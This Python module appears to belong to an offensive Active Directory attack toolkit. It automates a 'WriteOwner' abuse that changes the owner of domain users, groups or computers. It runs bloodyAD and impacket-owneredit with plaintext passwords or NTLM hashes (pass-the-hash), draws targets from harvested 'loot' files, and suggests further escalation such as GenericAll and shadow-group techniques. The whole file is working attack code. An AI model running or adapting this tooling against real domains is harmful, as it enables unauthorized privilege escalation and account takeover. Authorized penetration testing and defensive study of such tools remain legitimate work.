import os
from core.colors import red, green, blue, yellow
from core.helpers import run_command, select_from_list, get_bloodyad_auth


def attack_write_owner(session, *parts):
    print(blue("[*] Attempting to set object owner using bloodyAD..."))

    target_object = parts[0] if len(parts) >= 1 else None
    new_owner = parts[1] if len(parts) >= 2 else None

    if not target_object:
        target_object = _prompt_object("Select target object (user/group/computer):")

    if not new_owner:
        new_owner = _prompt_object("Select new owner (user/group):")

    # === Use short names only for bloodyAD
    success = _attempt_bloodyad(session, target_object, new_owner)
    if not success:
        # === Only then resolve DNs and fallback
        _attempt_owneredit(session, target_object, new_owner, fallback=True)


def _attempt_bloodyad(session, target_object, new_owner):
    auth = get_bloodyad_auth(session)
    cmd = (
        f"bloodyAD --host {session.dc_ip} -d {session.domain} {auth} "
        f"set owner \"{target_object}\" \"{new_owner}\""
    )

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    if "success" in combined.lower() or "owner" in combined.lower():
        print(green("[+] WriteOwner succeeded via bloodyAD:\n"))
        print(green(out.strip()))
        return True

    print(red("[-] bloodyAD WriteOwner failed. Will fallback to impacket-owneredit..."))
    return False


def _attempt_owneredit(session, target_object, new_owner, fallback=False):
    if session.hash:
        auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"{session.domain}/{session.username}:{session.password}"

    cmd = (
        f"impacket-owneredit -action write -new-owner \"{new_owner}\" "
        f"-target \"{target_object}\" {auth} -dc-ip {session.dc_ip}"
    )

    print(blue(f"[*] Running fallback: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    if any(x in combined.lower() for x in ["owner set", "successfully", "modified"]):
        print(green("[+] Fallback WriteOwner succeeded:\n"))
        print(green(out.strip()))
        return

    if "Current owner information below" in combined:
        print(yellow("[*] Current owner information below"))
        for line in combined.splitlines():
            if any(tag in line for tag in ["SID:", "sAMAccountName:", "distinguishedName:"]):
                print(yellow(line.strip()))

    if "0000051B" in combined or "constraint_att_type" in combined.lower():
        print(red("[-] WriteOwner blocked by AD schema constraint (error 0000051B)."))
        print(yellow("[!] Try AddSelf + GenericAll or shadow group techniques."))
        return

    print(red("[!] Fallback WriteOwner failed."))

    if fallback:
        print(yellow("[*] Attempting fallback by resolving both values to full DNs..."))
        resolved_target = _resolve_to_dn(target_object)
        resolved_owner = _resolve_to_dn(new_owner)
        if resolved_target and resolved_owner:
            _attempt_owneredit(session, resolved_target, resolved_owner, fallback=False)
        else:
            print(red("[-] Could not resolve to full DNs. Aborting."))
    else:
        print(red(err if err else out))


# ===================
# HELPERS
# ===================

def _prompt_object(prompt_msg):
    print(blue(f"[*] {prompt_msg}"))
    users, groups = _load_loot_users_groups()
    candidates = users + groups

    if not candidates:
        return input("[?] Enter short name or DN: ").strip()

    return select_from_list(candidates, "Choose object:")


def _resolve_to_dn(value):
    if value.upper().startswith("CN=") and "DC=" in value.upper():
        return value

    users, groups = _load_loot_users_groups()
    all_dn = users + groups
    val_lower = value.lower()

    for dn in all_dn:
        if f"CN={val_lower}" in dn.lower():
            return dn

    print(yellow(f"[!] Could not resolve '{value}' to DN."))
    return input("[?] Enter full DN manually: ").strip()


def _load_loot_users_groups():
    users, groups = [], []
    if os.path.exists("loot/valid_users.txt"):
        with open("loot/valid_users.txt", "r") as f:
            users = [line.strip() for line in f if line.strip()]
    if os.path.exists("loot/groups.txt"):
        with open("loot/groups.txt", "r") as f:
            groups = [line.strip() for line in f if line.strip()]
    return users, groups
